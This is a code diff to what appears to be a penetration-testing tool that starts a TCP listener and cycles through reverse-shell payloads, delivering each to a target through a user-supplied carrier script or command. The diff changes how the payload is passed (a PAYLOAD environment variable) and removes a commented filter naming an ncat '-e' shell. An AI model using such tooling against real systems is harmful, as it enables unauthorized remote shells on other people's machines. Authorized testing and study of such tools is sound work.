@@ -19,7 +19,7 @@ here = os.path.dirname(os.path.realpath(__file__)) + "/"
 # parse arguments
 parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter, description="Shell? Please?")
 parser.add_argument('-H',  '--host', '--local-host', type=str, help='local host', default='')
-parser.add_argument('-s',  '--carrier-script', type=str, help='shell script that sends the payload to the target, it should use a positional parameter as payload', default="")
+parser.add_argument('-s',  '--carrier-script', type=str, help='shell script that sends the payload to the target, it should use a PAYLOAD env variable as payload', default="")
 parser.add_argument('-c',  '--carrier-command', type=str, help='shell command that sends the payload to the target, it should use a PAYLOAD env variable as payload', default="")
 parser.add_argument('-C',  '--config', type=str, help='.json configuration file location', default= here + 'config.json')
 parser.add_argument('-os', '--os', choices=['linux', 'windows', 'mac'], help='target operating system', default='linux')
@@ -89,15 +89,16 @@ else:
 	print("[+] started tcp listener on %s:%d" % (host, port))
 
 
+# copy env variables
+env = os.environ.copy()
+
 # carrier thread
 def payload_carrier_thread(payload, exit_event):
-	# script carrier
-	if args.carrier_script != "":
-		process = subprocess.Popen([args.carrier_script, payload], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	# set payload env variable
+	env['PAYLOAD'] = payload
 
-	# command carrier
-	else:
-		process = subprocess.Popen(["/bin/bash", "-c", args.carrier_command], env={'PAYLOAD': payload}, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	carrier = ["/bin/bash", "-c", args.carrier_command] if args.carrier_command != "" else [args.carrier_script]
+	process = subprocess.Popen(carrier, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		
 	while not exit_event.is_set():
 		time.sleep(0.1)
@@ -113,9 +114,6 @@ def send_payload(payload):
 		
 # go through our pretty shells
 for shell in shells:
-	# if not "ncat.exe -e w/ download over cmd" in shell['name']:
-	# 	continue
-
 	# check disabled status
 	if 'disabled' in shell and shell['disabled'] == True:
 		continue
